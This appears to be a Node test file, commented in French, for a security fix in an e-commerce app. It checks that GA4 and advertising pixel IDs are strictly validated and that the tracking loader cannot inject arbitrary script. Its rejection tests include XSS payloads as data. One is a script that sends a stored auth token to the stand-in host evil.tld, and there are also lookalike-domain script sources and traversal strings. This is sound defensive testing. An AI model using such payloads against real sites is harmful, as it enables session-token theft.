// Tests du correctif C8 : identifiants de suivi (src/lib/trackingIds.ts) et absence d'injection de code libre.
// Exécution (Node >= 22.6, aucun accès réseau ni navigateur requis) :
//   node --experimental-strip-types --test supabase/tests/tracking-ids.test.ts
import { test } from "node:test";
import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import {
  extractGa4Id,
  isValidFacebookPixelId,
  isValidGa4Id,
  isValidSnapchatPixelId,
  isValidTiktokPixelId,
} from "../../src/lib/trackingIds.ts";

test("GA4 : accepte uniquement G- suivi de 4 à 20 majuscules/chiffres", () => {
  for (const ok of ["G-ABCD", "G-XXXXXXXXXX", "G-1A2B3C4D5E", "G-ABCDEFGHIJ0123456789"]) {
    assert.equal(isValidGa4Id(ok), true, ok);
  }
  for (const bad of [
    "", "G-", "G-ABC", "g-abcd1234", "UA-12345-1", "AW-123456789", " G-ABCD1234", "G-ABCD1234 ",
    "G-ABCD1234\n", "G-ABCD&x=1", "G-ABCD?id=1", "G-ABCD/../x", "G-<script>", "G-ABCDEFGHIJ01234567890",
    "https://www.googletagmanager.com/gtag/js?id=G-ABCD1234",
  ]) {
    assert.equal(isValidGa4Id(bad), false, JSON.stringify(bad));
  }
  for (const nonString of [null, undefined, 123, {}, ["G-ABCD1234"]]) {
    assert.equal(isValidGa4Id(nonString), false);
  }
});

test("extractGa4Id : ne renvoie que l'identifiant d'un snippet collé", () => {
  const snippet = `<script async src="https://www.googletagmanager.com/gtag/js?id=G-AB12CD34"></script>
<script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js',new Date());gtag('config','G-AB12CD34');</script>`;
  assert.equal(extractGa4Id(snippet), "G-AB12CD34");
  assert.equal(extractGa4Id("g-ab12cd34"), "G-AB12CD34");
  assert.equal(extractGa4Id("  G-AB12CD34  "), "G-AB12CD34");
});

test("extractGa4Id : charges utiles XSS et formats refusés", () => {
  const attacks = [
    `<script>fetch('https://evil.tld/?t='+localStorage.getItem('ecomfy-auth-token'))</script>`,
    `<script src="https://evil.tld/?https://googletagmanager.com"></script>`,
    `<script src="https://googletagmanager.com.evil.tld/x.js"></script>`,
    `<img src=x onerror=alert(1)>`,
    "UA-12345678-1",
    "AW-123456789",
    "XG-ABCD1234",
    "G-ABC",
    "",
  ];
  for (const a of attacks) assert.equal(extractGa4Id(a), null, a);
  for (const nonString of [null, undefined, 42, {}]) assert.equal(extractGa4Id(nonString), null);
});

test("extractGa4Id : un identifiant noyé dans du code n'autorise pas le code", () => {
  // L'identifiant est extrait, le reste est jeté : la valeur renvoyée est toujours un G-XXXX valide.
  const id = extractGa4Id(`<script>alert(1)</script> G-AB12CD34 <script>alert(2)</script>`);
  assert.equal(id, "G-AB12CD34");
  assert.match(id!, /^G-[A-Z0-9]{4,20}$/);
});

test("Pixels Meta, TikTok, Snapchat", () => {
  assert.equal(isValidFacebookPixelId("1234567890"), true);
  for (const bad of ["", "1234", "12345a", "123 456", "1234567890123456789012", "12345?x=1", "../123456"]) {
    assert.equal(isValidFacebookPixelId(bad), false, bad);
  }
  assert.equal(isValidTiktokPixelId("C1234567890"), true);
  assert.equal(isValidTiktokPixelId("c1234567890"), true);
  for (const bad of ["", "ABC", "C123456789&lib=x", "C1234567890/../x", "C123 4567"]) {
    assert.equal(isValidTiktokPixelId(bad), false, bad);
  }
  assert.equal(isValidSnapchatPixelId("a1b2c3d4-e5f6-7890-abcd-ef1234567890"), true);
  for (const bad of ["", "short", "abc/def/ghi/jkl", "a1b2c3d4?token=x", "a1b2c3d4 e5f6"]) {
    assert.equal(isValidSnapchatPixelId(bad), false, bad);
  }
});

test("tracking.ts : aucun chemin d'injection de code libre", () => {
  const src = readFileSync(new URL("../../src/lib/tracking.ts", import.meta.url), "utf8");
  assert.doesNotMatch(src, /innerHTML/, "innerHTML ne doit pas être utilisé");
  assert.doesNotMatch(src, /createElement\(["']template["']\)/);
  assert.doesNotMatch(src, /\.text\s*=/, "aucun script ne doit recevoir de contenu en ligne");
  assert.doesNotMatch(src, /setAttribute\(attr\.name/, "aucun attribut copié depuis du HTML marchand");
  assert.match(src, /extractGa4Id\(shop\.google_analytics_code\)/);
  // Chaque chargeur valide son identifiant avant toute insertion de script.
  for (const [fn, validator] of [
    ["loadFacebook", "isValidFacebookPixelId"],
    ["loadTikTok", "isValidTiktokPixelId"],
    ["loadSnapchat", "isValidSnapchatPixelId"],
    ["loadGA4", "isValidGa4Id"],
  ]) {
    const start = src.indexOf(`function ${fn}(`);
    assert.notEqual(start, -1, `${fn} introuvable`);
    assert.ok(src.slice(start, start + 140).includes(`if (!${validator}(`), `${fn} doit valider son identifiant en premier`);
  }
});
